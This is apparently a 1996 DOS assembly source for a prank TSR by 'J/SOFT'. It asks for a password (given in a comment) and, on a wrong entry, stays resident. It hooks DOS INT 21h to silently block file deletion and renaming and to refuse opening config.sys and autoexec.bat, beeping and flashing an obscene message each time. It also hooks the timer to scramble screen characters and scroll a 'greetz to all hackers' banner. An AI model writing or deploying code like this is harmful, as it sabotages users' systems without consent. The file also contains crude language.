;TSR, (c)1996 J/SOFT
;System requirements: 8086/88, 256Kb RAM, FDD(HDD), CGA :)
;This prog don't work fully under OS/2, Win95.
;P.S.:	 Password : "TRANSMOGRIFY" (UPPER case, without quotes :-)
;P.P.S.: Reboot to unload this shit :)
;
	jmp begin

int8i	;jmp ggg
	push ax
	push ds
	mov ax,cs
	mov ds,ax

	mov ax,[icnt]
	inc ax
	and ax,1
	mov [icnt],ax
	jnz ie

	push bx
	push cx
	push es

	xor ax,ax
	mov es,ax
	es:
	cmp byte [449h],4
	jnc ie0 	;jmp if not text mode.

	mov ax,0b800h
	mov es,ax
	mov bx,80
	call line
	mov cx,2048-80

mmm	es:
	mov al,[bx]
	mov ah,'/'	;
	cmp al,'|'
	jz sym_p
	mov ah,'-'	;
	cmp al,'/'
	jz sym_p
	mov ah,'\'	;
	cmp al,'-'
	jz sym_p
	mov ah,'|'	;
	cmp al,'\'
	jz sym_p

	mov ah,al
	cmp al,48
	jc sym_c
	cmp al,'9'+1
	jnc sym_c

	inc ah
	cmp ah,'9'+1
	jnz sym_p
	mov ah,'0'
	jmps sym_p
sym_c
	inc bx
	inc bx
	loop mmm

ie0	;call line
	pop es
	pop cx
	pop bx
ie	pop ds
	pop ax

ggg
	db 0eah
oldadr8 dw 0
oldseg8 dw 0

icnt	dw 0

sym_p	es:
	mov [bx],ah
	jmps sym_c

i21	sti
	cmp ah,13h
	jz no_del
	cmp ah,41h
	jz no_del
	cmp ah,17h
	jz no_del
	cmp ah,56h
	jz no_del
	cmp ah,3ah
	jz no_del
	cmp ah,3dh
	jz no_open
goto
	db 0eah
oldadr	dw 0
oldseg	dw 0
no_del	push ax
	push bx
	push cx
	push dx
	call fuck_on
	mov cx,10
no_del1 push cx
;	 call halt
	call halt
	mov ax,cx
	inc ah
	ADD AX,AX
	add ax,ax
	call sndon     ;!@#$%
	pop cx
	PUSH CX
;	 call halt
	call halt
	mov ax,cx
	not al
	add ax,ax
	add ax,ax
	call sndon
	pop cx
	loop no_del1
	call sndoff
	call fuck_on
	pop dx
	pop cx
	pop bx
	pop ax
	iret
no_open push ds
	push bx
	mov bx,dx		;'dblzx.com'
	cmp byte [bx],'d'
	jnz no_op1
	cmp byte [bx+1],'b'
	jnz no_op1
	cmp byte [bx+2],'l'
	jnz no_op1
	cmp byte [bx+3],'z'
	jnz no_op1
	cmp byte [bx+4],'x'
	jnz no_op1
	jmp no_op

no_op1	cmp byte [bx],'c'		;'config.sys'
	jnz no_op2
	cmp byte [bx+1],'o'
	jnz no_op2
	cmp byte [bx+2],'n'
	jnz no_op2
	cmp byte [bx+3],'f'
	jnz no_op2
	cmp byte [bx+4],'i'
	jnz no_op2
	cmp byte [bx+5],'g'
	jnz no_op2
	cmp byte [bx+6],'.'
	jnz no_op2
	cmp byte [bx+7],'s'
	jnz no_op2
	cmp byte [bx+8],'y'
	jnz no_op2
	cmp byte [bx+9],'s'
	jz no_op

no_op2	cmp byte [bx],'a'
	jnz no_op3
	cmp byte [bx+1],'u'
	jnz no_op3
	cmp byte [bx+2],'t'
	jnz no_op3
	cmp byte [bx+3],'o'
	jnz no_op3
	cmp byte [bx+4],'e'
	jnz no_op3
	cmp byte [bx+5],'x'
	jnz no_op3
	cmp byte [bx+6],'e'
	jnz no_op3
	cmp byte [bx+7],'c'
	jnz no_op3
	cmp byte [bx+8],'.'
	jnz no_op3
	cmp byte [bx+9],'b'
	jnz no_op3
	cmp byte [bx+10],'a'
	jnz no_op3
	cmp byte [bx+11],'t'
	jz no_op
NO_OP3	pop bx
	pop ds
	jmp goto

no_op	pop bx
	pop ds
	jmp no_del

;****************************;
; WASM Sound Module	     ;
; By Eric Tauck 	     ;
;			     ;
; Defines:		     ;
;			     ;
;   SndOn   turn speaker on  ;
;   SndOff  turn speaker off ;
;****************************;


;--- local definitions

_snd_TIMER	 EQU	 40H		;8253 timer port
_snd_PORTB	 EQU	 61H		;8255 controller port B
_snd_SBITS	 EQU	 00000011B	;sound bits of port B
_snd_HZDHI	 EQU	 0012H		;hertz conversion constant, high word
_snd_HZDLO	 EQU	 34DDH		;hertz conversion constant, low word

;========================================
; Turn on speaker.
;
; In: AX= hertz.

SndOn	PROC	NEAR

;--- calculate frequency value

	mov	bx, ax
	mov	ax, _snd_HZDLO		;
	mov	dx, _snd_HZDHI		;load divisor
	div	ax, bx			;get frequency value
	mov	dx, ax			;save in DX

;--- check sound bits

	in	al, _snd_PORTB		;get current settings
	test	al, _snd_SBITS		;check if sound bits set
	jnz	_sdon1			;skip if so

	or	al, _snd_SBITS		;turn sound on
	out	_snd_PORTB, al		;send data
	mov	al, 10110110B		;select timer 2, MSB, LSB
	out	_snd_TIMER+3, al	;write timer mode

;--- set frequency

_sdon1	mov	al, dl
	out	_snd_TIMER+2, al	;send low byte
	mov	al, dh
	out	_snd_TIMER+2, al	;send high byte
	ret
	ENDP

;========================================
; Turn off speaker.

SndOff	PROC   NEAR
	in	al, _snd_PORTB		;get current settings
	and	al, NOT _snd_SBITS	;clear sound bits
	out	_snd_PORTB, al		;send data
	ret
	ENDP

halt	mov dx,3dah
vrt	in al,dx
	test al,8
	jnz vrt
novrt	in al,dx
	test al,8
	jz novrt
	retn
linadr	dw offset line_txt - 1
line	push si
	push di
	mov si,[linadr]
	inc si
	cmp byte [si],0
	jnz lincnt1
	mov si,offset line_txt - 1
lincnt1 mov [linadr],si
	mov cx,40
	xor di,di
	cld
copy1	movsb
	inc di
	loop copy1
	pop di
	pop si
	retn
line_txt
	ds 40,' '
	db '* GREETZ FROM J/SOFT (YURY',39,'96) TO ALL HACKERS ! *',0
	ds 40,' '

fuck_on 		;ax,bx,cx,dx
	push ds
	xor ax,ax
	mov ds,ax
	cmp byte [449h],3
	jnz f_on_e		;jmp if not text mode.

	push es
	push si
	push di

	push cs
	pop ds
	mov ax,0b800h
	mov es,ax
	mov si,offset msg
	mov di,160*7+68 	;position of window ("FUCK YOU!")
	mov cx,12
	push cx
	push cx

	call f_copy

	mov di,160*8+68 	;
	pop cx

	call f_copy

	mov di,160*9+68 	;
	pop cx

	call f_copy

	pop di
	pop si
	pop es
f_on_e	pop ds
	retn

f_copy	mov al,[si]
	es:
	xchg al,[di]
	mov [si],al
	inc di
	inc di
	inc si
	loop f_copy
	retn
msg	db 'É'
	ds 10,'Í'
	db '»'
	db 'ºFUCK YOU !º'
	db 'È'
	ds 10,'Í'
	db '¼'

intinit call rest
	mov al,21h
	call getint
	mov [oldseg],es
	mov [oldadr],bx
	mov al,21h
	mov dx,offset i21
	call setint
	mov al,08h
	call getint
	mov [oldseg8],es
	mov [oldadr8],bx
	mov dx,offset int8i
	mov al,08h
	call setint
;Release memory block
	mov es,[2ch]
	mov ah,49h
	int 21h

	mov dx,offset intinit
	int 27h

getint	cli
	push ds
	mov ah,4
	mul ah
	mov di,ax
	xor ax,ax
	mov ds,ax
	les bx,[di]
	pop ds
	sti
	retn
setint	cli
	push ds
	mov ah,4
	mul ah
	mov di,ax
	xor ax,ax
	mov ds,ax
	mov [di],dx
	inc di
	inc di
	mov [di],cs
	pop ds
	sti
	retn

begin	push ds
	push es

	mov ah,3
	xor bh,bh
	int 10h
	mov [oldcur],dx

	push cs
	pop es
	mov ax,0b800h
	push ax
	pop ds
	xor si,si
	mov di,offset txtbuf
	mov cx,8192
	rep
	movsw

	pop es
	pop ds

	mov ax,4
	int 10h

	mov ah,0bh
	mov bx,0100h
	int 10h

	mov bx,offset txt
	call prtbig

	mov dx,0800h
	mov ah,2
	xor bh,bh
	int 10h

	call main
	call rest
	int 20h

rest	mov ax,3
	int 10h

	push cs
	pop ds
	mov dx,[oldcur]
	mov ah,2
	xor bh,bh
	int 10h

	mov ax,0b800h
	push ax
	pop es
	mov si,offset txtbuf
	xor di,di
	mov cx,8192
	rep
	movsw
	retn

prtbig	cmp byte [bx],'$'
	jnz prtbig2
	retn
prtbig2 cmp byte [bx],' '
	jz nohalt
	call halt
nohalt	mov al,[bx]
	push bx
	call bigsym
	pop bx
	inc bx
	jmps prtbig

oldcur	dw 0

bigsym	push ds
	push es
;GetFont
	 push ax
	 mov ax,1130h
	 mov bh,3
	 int 10h  ;ES:BP=Font Address.
	 mov bx,bp
	 pop ax
;	 mov bx,0f000h
;	 mov es,bx
;	 mov bx,0fa6eh	 ;standard font is at f000:fa6e
	xor ah,ah
	add ax,ax
	add ax,ax
	add ax,ax
	add bx,ax
	push bx
	mov ax,0b800h
	mov ds,ax
	cs:
	mov ax,[symadr]
	inc ax
	inc ax
	push ax
	mov bl,80
	div bl
	test ah,ah
	pop ax
	jnz bigsym1
	add ax,280h
bigsym1 cs:
	mov [symadr],ax
	pop bx
	mov di,ax
	mov cx,8
bigsym2 es:
	mov dl,[bx]
	push cx
	mov cx,8
	push bx
	xor bx,bx
bigsym3 shl dl
	rcl bx
	clc
	rcl bx
	loop bigsym3
	xchg bh,bl

	mov [di],bx
	xor di,8192
	mov [di],bx
	pop bx
	pop cx
	xor di,8192
	add di,80
	inc bx

	loop bigsym2

	pop es
	pop ds
	retn
symadr	dw 0

txt	db 'Enter the magic word or press ENTER if you don',39,'t know it'
	db '			   >$'
txtbuf	ds 16384

main	mov byte [xcur],1

input	mov al,'_'
	call bigsym
	sub word [symadr],2
	mov cx,8
flash1	call halt
	mov ah,1
	int 16h
	jnz scankey
	loop flash1
	mov al,' '
	call bigsym
	sub word [symadr],2
	mov cx,8
flash2	call halt
	mov ah,1
	int 16h
	jnz scankey
	loop flash2
	jmps input

scankey xor ah,ah
	int 16h
	cmp al,13
	jz key_ent
	cmp al,8
	jnz no_bk

	mov al,[xcur]
	dec al
	cmp al,1
	jc input

	mov [xcur],al
	mov di,offset key_buf

	push ax
	pop bx
	xor bh,bh
	mov al,' '
	mov byte [di+bx-1],al
	sub word [symadr],2
	call bigsym
	mov al,' '
	call bigsym
	sub word [symadr],4
	jmps input

no_bk	cmp byte [xcur],39
	jnc input
	mov di,offset key_buf
	mov bl,[xcur]
	xor bh,bh
	mov [di+bx-1],al
;****
	cmp al,65
	jc hid
	cmp al,91
	jnc hid
	mov al,''
hid	call bigsym

	inc byte [xcur]
	jmp input
key_ent mov al,' '
	call bigsym
	cmp byte [xcur],13
	jnz wrong
	cmp byte [key_buf],'T'
	jnz wrong
	cmp byte [key_buf+4],'S'
	jnz wrong
	cmp byte [key_buf+3],'N'
	jnz wrong
	cmp byte [key_buf+5],'M'
	jnz wrong
	cmp byte [key_buf+7],'G'
	jnz wrong
	cmp byte [key_buf+2],'A'
	jnz wrong
	cmp byte [key_buf+8],'R'
	jnz wrong
	cmp byte [key_buf+11],'Y'
	jnz wrong
	cmp byte [key_buf+6],'O'
	jnz wrong
	cmp byte [key_buf+9],'I'
	jnz wrong
	cmp byte [key_buf+10],'F'
	jnz wrong
	cmp byte [key_buf+1],'R'
	jnz wrong

	call setsymadr

	mov bx,offset pass_ok
	call prtbig
	mov cx,50
www1	call halt
	call rnd
	mov ah,1
	add ax,ax

	push cx
	call sndon
	pop cx
	loop www1
	call sndoff
	retn

wrong	call setsymadr
	mov bx,offset pass_wr
	call prtbig
	mov cx,50
www2	call halt
	mov ax,cx
	add ax,ax
	inc ah
	inc ah
	push cx
	call sndon
	pop cx
	loop www2
	call sndoff
	jmp intinit

xcur	db 0
rnd	mov ah,[r1]
	mov al,[r2]
	mov [r1],al
	add ah,al
	mov al,[r3]
	mov [r2],al
	add al,ah
	rol al
	mov [r3],al
	retn
pass_ok db 'PASSWORD OK - ACCESS GRANTED !!!$'
r1	db 5
r2	db 90
r3	db 37
pass_wr db 'WRONG PASSWORD - ACCESS DENIED !$'
setsymadr
	mov ax,2560
	mov [symadr],ax
	retn
key_buf ds 40
